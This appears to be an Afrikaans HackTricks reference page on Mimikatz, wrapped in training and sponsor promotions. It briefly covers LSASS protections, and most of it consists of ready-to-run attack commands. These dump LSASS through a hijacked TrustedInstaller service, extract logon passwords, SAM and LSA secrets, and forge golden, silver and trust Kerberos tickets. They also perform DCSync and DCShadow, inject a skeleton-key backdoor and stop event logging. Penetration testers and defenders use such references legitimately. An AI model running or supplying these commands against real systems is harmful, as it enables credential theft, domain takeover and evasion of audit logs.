# Mimikatz

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:

{% embed url="https://academy.8ksec.io/" %}


**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Kyk na die oorspronklike vir verdere inligting!

## LM en Duidelike Teks in geheue

Vanaf Windows 8.1 en Windows Server 2012 R2, is beduidende maatreëls geïmplementeer om teen kredietbewysdiefstal te beskerm:

- **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.

- **LSA Beskerming** word bekendgestel om die Local Security Authority (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
1. Die registrasie te wysig by _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
2. 'n Groep Beleid Objekt (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.

Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.

### Teenwerking van SeDebugPrivilege Verwydering

Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewyse uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dit stel die dumping van die `lsass.exe` geheue na 'n lêer in, wat dan op 'n ander stelsel ontleed kan word om kredensiale te onttrek:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Opsies

Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Gebeurtenisdienste om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:

#### Skoonmaak van Gebeurtenislogs

- **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit is egter tipies dat gebeurtenislog manipulasie die gebruik van stelsels gereedskap of skripte buite Mimikatz behels om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).

#### Eksperimentele Kenmerk: Patching die Gebeurtenisdienste

- **Opdrag**: `event::drop`
- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Gebeurtenisregistrasiediens te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse opneem.
- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige voorregte werk om stelseldienste te wysig.
- Die `event::drop` opdrag patch dan die Gebeurtenisregistrasiediens.


### Kerberos Tekenaanvalle

### Goue Teken Skepping

'n Goue Teken stel in staat tot domein-wye toegang impersonasie. Sleutelopdrag en parameters:

- Opdrag: `kerberos::golden`
- Parameters:
- `/domain`: Die domeinnaam.
- `/sid`: Die domein se Veiligheidsidentifiseerder (SID).
- `/user`: Die gebruikersnaam om te impersonate.
- `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
- `/ptt`: Injekting van die teken direk in geheue.
- `/ticket`: Stoor die teken vir later gebruik.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets bied toegang tot spesifieke dienste. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
- Parameters:
- `/service`: Die diens om te teiken (bv., cifs, http).
- Ander parameters soortgelyk aan Golden Ticket.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets word gebruik om toegang tot hulpbronne oor domeine te verkry deur vertrouensverhoudings te benut. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan Golden Ticket, maar vir vertrouensverhoudings.
- Parameters:
- `/target`: Die FQDN van die teikendomein.
- `/rc4`: Die NTLM-hash vir die vertrouensrekening.

Voorbeeld:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Bykomende Kerberos Opdragte

- **Lys Kaartjies**:
- Opdrag: `kerberos::list`
- Lys alle Kerberos kaartjies vir die huidige gebruikersessie.

- **Gee die Kas**:
- Opdrag: `kerberos::ptc`
- Spuit Kerberos kaartjies in vanaf kaslêers.
- Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Gee die Kaartjie**:
- Opdrag: `kerberos::ptt`
- Laat toe om 'n Kerberos kaartjie in 'n ander sessie te gebruik.
- Voorbeeld: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Verwyder Kaartjies**:
- Opdrag: `kerberos::purge`
- Verwyder alle Kerberos kaartjies uit die sessie.
- Nuttig voor die gebruik van kaartjie manipulasie opdragte om konflikte te vermy.

### Aktiewe Gids Manipulasie

- **DCShadow**: Tydelik 'n masjien laat optree as 'n DC vir AD objek manipulasie.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naboots 'n DC om wagwoorddata aan te vra.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Krediettoegang

- **LSADUMP::LSA**: Trek krediete uit LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Naboots 'n DC met 'n rekenaarrekening se wagwoorddata.
- *Geen spesifieke opdrag verskaf vir NetSync in oorspronklike konteks.*

- **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Ontsleutel geheime wat in die registrasie gestoor is.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Verkry vertrouensverifikasie-inligting.
- `mimikatz "lsadump::trust" exit`

### Divers

- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Verkry rugsteunregte.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry debug regte.
- `mimikatz "privilege::debug" exit`

### Kredietdumping

- **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Trek Kerberos kaartjies uit geheue.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid en Token Manipulasie

- **SID::add/modify**: Verander SID en SIDHistory.
- Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Wysig: *Geen spesifieke opdrag vir wysiging in oorspronklike konteks.*

- **TOKEN::Elevate**: Naboots tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Dienste

- **TS::MultiRDP**: Laat meerdere RDP sessies toe.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP sessies.
- *Geen spesifieke opdrag verskaf vir TS::Sessions in oorspronklike konteks.*

### Kluis

- Trek wagwoorde uit Windows Kluis.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
